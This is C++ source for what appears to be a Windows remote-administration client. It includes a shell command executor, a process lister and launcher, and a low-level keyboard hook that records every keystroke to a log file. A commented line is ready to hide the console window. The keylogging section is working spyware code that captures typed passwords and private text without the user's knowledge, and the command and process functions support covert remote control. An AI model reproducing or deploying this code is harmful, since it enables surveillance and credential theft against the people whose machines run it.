#include "stdafx.h"
#include <string>
#include <windows.h>
#include <tlhelp32.h>
#include <tchar.h>
#include "GUI_Client2.h"
#include "GUI_Client2.h"
#include<conio.h>
#include <fstream>
#include "utils.h"
#pragma warning(disable:4996)


using namespace std;


std::string exec(const char* cmd) {
	char buffer[128];
	std::string result = "";
	FILE* pipe = _popen(cmd, "r");
	if (!pipe){
		//throw std::runtime_error("popen() failed!");

	}
	try {
		while (!feof(pipe)) {
			if (fgets(buffer, 128, pipe) != NULL)
				result += buffer;
		}
	}
	catch (...) {
		_pclose(pipe);
		throw;
	}
	_pclose(pipe);
	return result;
}

WCHAR* GetProcessList()
{
	WCHAR* ret = new WCHAR[10000];
	HANDLE hProcessSnap;
	HANDLE hProcess;
	PROCESSENTRY32 pe32;
	DWORD dwPriorityClass;

	// Take a snapshot of all processes in the system.
	hProcessSnap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
	if (hProcessSnap == INVALID_HANDLE_VALUE)
	{
		//printError(TEXT("CreateToolhelp32Snapshot (of processes)"));
		delete ret;
		return NULL;
	}

	// Set the size of the structure before using it.
	pe32.dwSize = sizeof(PROCESSENTRY32);

	// Retrieve information about the first process,
	// and exit if unsuccessful
	if (!Process32First(hProcessSnap, &pe32))
	{
		//printError(TEXT("Process32First")); // show cause of failure
		CloseHandle(hProcessSnap);          // clean the snapshot object
		delete ret;
		return NULL;
	}

	// Now walk the snapshot of processes, and
	// display information about each process in turn
	int j = 0;
	do
	{
		// Retrieve the priority class.
		dwPriorityClass = 0;
		hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, pe32.th32ProcessID);
		j += swprintf(ret + j, L"%-50sPID=%d \r\n", pe32.szExeFile, pe32.th32ProcessID);

	} while (Process32Next(hProcessSnap, &pe32));

	CloseHandle(hProcessSnap);
	return ret;
}

bool openProcess(TCHAR* procname)
{
	STARTUPINFO si;
	PROCESS_INFORMATION pi;

	ZeroMemory(&si, sizeof(si));
	si.cb = sizeof(si);
	ZeroMemory(&pi, sizeof(pi));


	// Start the child process. 
	if (!CreateProcess(NULL,   // No module name (use command line)
		procname,        // Command line
		NULL,           // Process handle not inheritable
		NULL,           // Thread handle not inheritable
		FALSE,          // Set handle inheritance to FALSE
		0,              // No creation flags
		NULL,           // Use parent's environment block
		NULL,           // Use parent's starting directory 
		&si,            // Pointer to STARTUPINFO structure
		&pi)           // Pointer to PROCESS_INFORMATION structure
		)
	{
		//printf("CreateProcess failed (%d).\n", GetLastError());
		return false;
	}

	// Close process and thread handles. 
	CloseHandle(pi.hProcess);
	CloseHandle(pi.hThread);
	return true;
}





//KEY HOOK FUNCTIONS
#define _WIN32_WINNT 0x0400
#pragma comment( lib, "user32.lib" )

//declare global variable
HHOOK hKeyboardHook;
ofstream keylogfile;


__declspec(dllexport) LRESULT CALLBACK KeyboardEvent(int nCode, WPARAM wParam, LPARAM lParam)
{
	DWORD SHIFT_key = 0;
	DWORD CTRL_key = 0;
	DWORD ALT_key = 0;

	if ((nCode == HC_ACTION) && ((wParam == WM_SYSKEYDOWN) || (wParam == WM_KEYDOWN)))
	{
		KBDLLHOOKSTRUCT hooked_key = *((KBDLLHOOKSTRUCT*)lParam);
		DWORD dwMsg = 1;
		dwMsg += hooked_key.scanCode << 16;
		dwMsg += hooked_key.flags << 24;
		char lpszKeyName[1024] = { 0 };

		int i = GetKeyNameText(dwMsg, (LPWSTR)(lpszKeyName + 1), 0xFF) + 1;

		int key = hooked_key.vkCode;

		SHIFT_key = GetAsyncKeyState(VK_SHIFT);
		CTRL_key = GetAsyncKeyState(VK_CONTROL);
		ALT_key = GetAsyncKeyState(VK_MENU);

		if (theApp.isHooked == false)
			PostQuitMessage(0);

		if (key >= 'A' && key <= 'Z' && GetAsyncKeyState(VK_SHIFT) >= 0)
			key += 32;

		
		if (keylogfile.is_open())
			keylogfile << (char)key;
		
		SHIFT_key = 0;
		CTRL_key = 0;
		ALT_key = 0;
	}
	return CallNextHookEx(hKeyboardHook, nCode, wParam, lParam);
}

void MessageLoop()
{
	MSG message;
	while (theApp.isHooked && GetMessage(&message, NULL, 0, 0))
	{
		TranslateMessage(&message);
		DispatchMessage(&message);
	}
}

DWORD WINAPI my_HotKey(LPVOID lpParm)
{
	HINSTANCE hInstance = GetModuleHandle(NULL);
	if (!hInstance) hInstance = LoadLibrary((LPCWSTR)lpParm);
	if (!hInstance) return 1;

	hKeyboardHook = SetWindowsHookEx(WH_KEYBOARD_LL, (HOOKPROC)KeyboardEvent, hInstance, NULL);
	MessageLoop();
	UnhookWindowsHookEx(hKeyboardHook);
	return 0;
}

void getHookedKey()
{
	HANDLE hThread;
	DWORD dwThread;

	hThread = CreateThread(NULL, NULL, (LPTHREAD_START_ROUTINE)my_HotKey, (LPVOID)NULL, NULL, &dwThread);

	/* uncomment to hide console window */
	//ShowWindow(FindWindowA("ConsoleWindowClass", NULL), false);

	WaitForSingleObject(hThread, INFINITE);

}


UINT _cdecl thread_keyboardcatch(LPVOID pParam){
	keylogfile.open(KEY_LOG_FILE_PATH, fstream::out, fstream::trunc);
	getHookedKey();
	return 0;
}